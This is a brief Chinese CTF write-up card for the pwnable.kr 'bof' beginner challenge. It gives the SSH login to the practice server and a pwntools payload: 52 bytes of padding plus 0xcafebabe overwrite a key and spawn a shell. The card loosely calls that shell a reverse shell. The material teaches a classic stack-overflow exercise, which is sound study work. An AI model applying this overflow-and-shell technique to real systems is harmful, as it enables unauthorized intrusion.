---
title: "[pwnable.kr] bof 题解"
category: pwn
tags: ["pwnable.kr", "pwn", "pwnable_kr", "bof_buffer_overflow", "canary_disabled", "ssh_pwntools"]
signals: ["pwnable.kr 2025", "pwnable_kr", "bof_buffer_overflow", "canary_disabled", "ssh_pwntools", "simple_stack_smash", "p32_key_overwrite", "aslr_disabled_pwnable", "classic_pwn_lesson", "rop", "pwnable", "bof", "padding", "p32"]
difficulty: easy
source: "https://www.ctfiot.com/282222.html"
tools: ["pwntools"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# [pwnable.kr] bof 题解

> 赛事：pwnable.kr 2025 | 方向：pwn | 难度：easy | 工具：pwntools

## 一句话总结

pwnable.kr 经典 bof 题：52 字节 (13 * 4) padding + p32(0xcafebabe) 覆盖 key → 触发 system("/bin/sh") 反弹 shell。

## 攻击链

1. ssh bof@pwnable.kr:2222 password guest → process ''./bof'' argv=[''bof''] → key=0xcafebabe → payload = b''A'' * 52 + p32(0xcafebabe) → overflow me : 触发覆盖 key → system("/bin/sh") 反弹

## 关键 payload

```
bof = b'A'*13*4 + p32(0xcafebabe) / ssh('bof', 'pwnable.kr', password='guest', port=2222) / p.sendline(bof) / p.interactive()
```

## 经验教训

pwnable.kr bof 是 CTF PWN 入门经典题，无 canary + 无 PIE + ASLR 禁用，payload 直接覆盖 key 触发后门；pwntools ssh 模块一键连远程。

## 标签

pwnable_kr、bof_buffer_overflow、canary_disabled、ssh_pwntools、simple_stack_smash、p32_key_overwrite、aslr_disabled_pwnable、classic_pwn_lesson、13x4_52_byte_padding

## 参考来源

- https://www.ctfiot.com/282222.html
- 原文件：[pwnable.kr]_bof_题解.full.md
